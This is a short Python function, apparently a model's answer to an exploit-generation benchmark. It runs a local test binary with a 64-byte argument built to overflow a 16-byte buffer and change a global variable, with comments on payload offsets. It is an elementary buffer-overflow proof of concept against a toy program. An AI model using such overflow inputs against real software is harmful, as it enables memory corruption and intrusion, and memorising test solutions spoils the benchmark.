  def execute_program(timeout: int) -> tuple[str, int]:
      import signal
      import subprocess

      # Create a long input string (>16 bytes) that can potentially overflow the buffer
      # and overwrite the global variable 'n' with a value != 5
      # 
      # Strategy:
      # - Use 64 bytes to ensure we overflow sufficiently
      # - Place the value 0x41414141 (1094795585 in decimal, clearly != 5) 
      #   at multiple potential offsets to increase chances of hitting 'n'
      # - Use a pattern that might help identify the correct offset
      
      # Create a pattern: 16 bytes of filler, then repeated 0x41 (A) values
      # This creates a long string with the pattern AAAA... that might overwrite 'n'
      overflow_string = "A" * 16 + "B" * 16 + "C" * 16 + "D" * 16  # 64 bytes total
      
      # Alternative: create a pattern with specific values that might overwrite 'n' with != 5
      # Using 0x00000000 (0) which is clearly != 5
      # overflow_string = "A" * 16 + "\x00\x00\x00\x00" + "A" * 44  # 64 bytes with null bytes
      
      try:
          result = subprocess.run(
              ["./temp_executable", overflow_string],
              capture_output=True,
              encoding="utf-8",
              errors="replace",
              timeout=timeout,
          )
          # Return stderr and the return code
          return result.stderr, result.returncode
      except subprocess.TimeoutExpired as e:
          # Timeout occurred, also ensure to return stderr captured before timeout and return code -signal.SIGKILL
          stderr_text = e.stderr.decode('utf-8', errors='replace') if e.stderr else ""
          return stderr_text, -signal.SIGKILL
      except Exception as e:
          # ensure to raise the error if run failed
          raise e
